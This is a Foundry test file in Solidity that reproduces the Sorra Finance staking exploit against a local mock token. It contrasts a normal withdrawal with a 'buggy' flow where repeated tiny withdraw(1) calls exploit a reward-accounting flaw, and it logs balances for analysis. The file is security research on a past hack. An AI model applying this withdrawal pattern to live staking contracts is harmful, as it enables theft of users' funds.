// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {sorraStaking as SorraStaking} from "../../src/sorra/SorraStaking.sol";
import {MockERC20} from "../MockERC20.sol";

// origin: https://www.quillaudits.com/blog/hack-analysis/sorra-finance-hack-smart-contract-exploit
contract SorraTest is Test {
    SorraStaking sorraStaking;
    MockERC20 rewardToken;

    address owner = makeAddr("owner");
    address user = makeAddr("user");
    address user2 = makeAddr("user2");

    function setUp() public {
        rewardToken = new MockERC20("RWD", "RWD", 18);
        rewardToken.mint(user, 100 ether);
        rewardToken.mint(user2, 100 ether);

        vm.prank(owner);
        sorraStaking = new SorraStaking(address(rewardToken));

        vm.prank(user);
        rewardToken.approve(address(sorraStaking), type(uint256).max);
        vm.prank(user2);
        rewardToken.approve(address(sorraStaking), type(uint256).max);
    }

    function testFlowNormal() public {
        // user stakes for tier 0 (14 days)
        vm.prank(user);
        sorraStaking.deposit(100 ether, 0);

        // user2 stakes for tier 0 (14 days)
        vm.prank(user2);
        sorraStaking.deposit(100 ether, 0);

        skip(14 days + 1);

        vm.prank(user);
        sorraStaking.withdraw(100 ether);

        debug();
    }

    function testFlowBuggy() public {
        // user stakes for tier 0 (14 days)
        vm.prank(user);
        sorraStaking.deposit(100 ether, 0);

        // user2 stakes for tier 0 (14 days)
        vm.prank(user2);
        sorraStaking.deposit(100 ether, 0);

        skip(14 days + 1);

        debug();

        vm.prank(user2);
        sorraStaking.withdraw(1);

        vm.prank(user2);
        sorraStaking.withdraw(1);

        debug();
    }

    function testCertoraLike() public {
        uint amount = 100 ether;

        // user stakes for tier 0 (14 days)
        vm.prank(user);
        sorraStaking.deposit(amount, 0);

        // user2 stakes for tier 0 (14 days)
        vm.prank(user2);
        sorraStaking.deposit(amount, 0);

        skip(14 days + 1);

        vm.prank(user2);
        sorraStaking.withdraw(amount / 2);

        debug();

        uint256 user2BalanceBefore = rewardToken.balanceOf(user2);
        uint256 pendingRewardsBefore = sorraStaking.getPendingRewards(user2);

        uint256 withdrawAmount = amount / 4;

        vm.prank(user2);
        sorraStaking.withdraw(withdrawAmount);    

        uint256 user2BalanceAfter = rewardToken.balanceOf(user2);
        uint256 pendingRewardsAfter = sorraStaking.getPendingRewards(user2);

        debug();

        console2.log("===assert===");
        console2.log("part1         :", withdrawAmount + pendingRewardsBefore);
        console2.log("part2         :", user2BalanceAfter - user2BalanceBefore + pendingRewardsAfter);
        // assertTrue((withdrawAmount + pendingRewardsBefore) == (user2BalanceAfter - user2BalanceBefore + pendingRewardsAfter));
    }

    function debug() public {
        console2.log("===debug===");
        console2.log("User balance         :", rewardToken.balanceOf(user));
        console2.log("User2 balance        :", rewardToken.balanceOf(user2));
        console2.log("SorraStaking balance :", rewardToken.balanceOf(address(sorraStaking)));
        console2.log("User pending rewards :", sorraStaking.getPendingRewards(user));
        console2.log("User2 pending rewards:", sorraStaking.getPendingRewards(user2));
    }
}
